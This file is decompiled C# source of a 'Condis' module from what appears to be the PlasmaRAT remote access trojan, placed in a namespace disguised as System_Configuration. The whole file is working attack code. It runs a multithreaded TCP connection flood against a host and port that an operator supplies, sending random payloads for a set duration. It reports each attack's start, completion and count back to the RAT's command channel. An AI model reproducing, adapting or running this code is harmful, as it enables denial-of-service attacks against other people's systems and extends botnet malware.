using System;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

namespace System_Configuration
{
	// Token: 0x02000007 RID: 7
	[StandardModule]
	public sealed class Condis
	{
		// Token: 0x06000014 RID: 20 RVA: 0x00003184 File Offset: 0x00001384
		public static void StartCondis(string Host, int Threadsto, int Time, int Ports)
		{
			if (!Condis.AttackRunning)
			{
				Condis.AttackRunning = true;
				Condis.HostToAttack = Host;
				Condis.Port = Ports;
				Condis.ThreadstoUse = Threadsto;
				Condis.TimetoAttack = Time;
				Condis.Threads = new Thread[Threadsto - 1 + 1];
				PlasmaRAT.TalktoChannel(string.Concat(new string[]
				{
					"Condis Attack on ",
					Condis.HostToAttack,
					":",
					Condis.Port.ToString(),
					" Started!"
				}), "");
				int num = 0;
				int num2 = Threadsto - 1;
				for (int i = num; i <= num2; i++)
				{
					Condis.Threads[i] = new Thread(new ThreadStart(Condis.DoWork));
					Condis.Threads[i].IsBackground = true;
					Condis.Threads[i].Start();
				}
			}
			else
			{
				PlasmaRAT.TalktoChannel("A Condis Attack is Already Running on " + Condis.HostToAttack + ":" + Condis.Port.ToString(), "");
			}
		}

		// Token: 0x06000015 RID: 21 RVA: 0x00003298 File Offset: 0x00001498
		private static void lol()
		{
			Condis.ThreadsEnded = Operators.AddObject(Condis.ThreadsEnded, 1);
			if (Operators.ConditionalCompareObjectEqual(Condis.ThreadsEnded, Condis.ThreadstoUse, false))
			{
				Condis.ThreadsEnded = 0;
				Condis.ThreadstoUse = 0;
				Condis.AttackRunning = false;
				PlasmaRAT.TalktoChannel(string.Concat(new string[]
				{
					"Condis Attack on ",
					Condis.HostToAttack,
					":",
					Condis.Port.ToString(),
					" finished successfully. Attacks Sent: ",
					Condis.attacks.ToString()
				}), "");
				Condis.attacks = 0;
			}
		}

		// Token: 0x06000016 RID: 22 RVA: 0x0000335C File Offset: 0x0000155C
		public static void StopCondis()
		{
			if (Condis.AttackRunning)
			{
				int num = 0;
				int num2 = Condis.ThreadstoUse - 1;
				for (int i = num; i <= num2; i++)
				{
					try
					{
						Condis.Threads[i].Abort();
					}
					catch (Exception ex)
					{
					}
				}
				Condis.AttackRunning = false;
				PlasmaRAT.TalktoChannel(string.Concat(new string[]
				{
					"Condis Attack on ",
					Condis.HostToAttack,
					":",
					Condis.Port.ToString(),
					" aborted successfully. Attacks Sent: ",
					Condis.attacks.ToString()
				}), "");
				Condis.attacks = 0;
			}
			else
			{
				PlasmaRAT.TalktoChannel("No Condis Attack is Running!", "");
			}
		}

		// Token: 0x06000017 RID: 23 RVA: 0x0000343C File Offset: 0x0000163C
		private static void DoWork()
		{
			try
			{
				TimeSpan t = TimeSpan.FromSeconds((double)Condis.TimetoAttack);
				Stopwatch stopwatch = Stopwatch.StartNew();
				IPAddress address = IPAddress.Parse(Dns.GetHostAddresses(Condis.HostToAttack)[0].ToString());
				IPEndPoint remoteEP = new IPEndPoint(address, Condis.Port);
				while (stopwatch.Elapsed < t)
				{
					try
					{
						Random random = new Random();
						byte[] array = new byte[100];
						int num = 0;
						do
						{
							array[num] = (byte)random.Next(0, 100);
							num++;
						}
						while (num <= 99);
						Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
						socket.Connect(remoteEP);
						socket.SendTo(array, remoteEP);
						Condis.attacks++;
						socket.Close();
					}
					catch (Exception ex)
					{
					}
				}
			}
			catch (Exception ex2)
			{
			}
			Condis.lol();
		}

		// Token: 0x04000015 RID: 21
		private static object ThreadsEnded = 0;

		// Token: 0x04000016 RID: 22
		private static string HostToAttack;

		// Token: 0x04000017 RID: 23
		private static int TimetoAttack;

		// Token: 0x04000018 RID: 24
		private static int ThreadstoUse;

		// Token: 0x04000019 RID: 25
		private static int Port;

		// Token: 0x0400001A RID: 26
		private static Thread[] Threads;

		// Token: 0x0400001B RID: 27
		private static bool AttackRunning = false;

		// Token: 0x0400001C RID: 28
		private static int attacks = 0;
	}
}
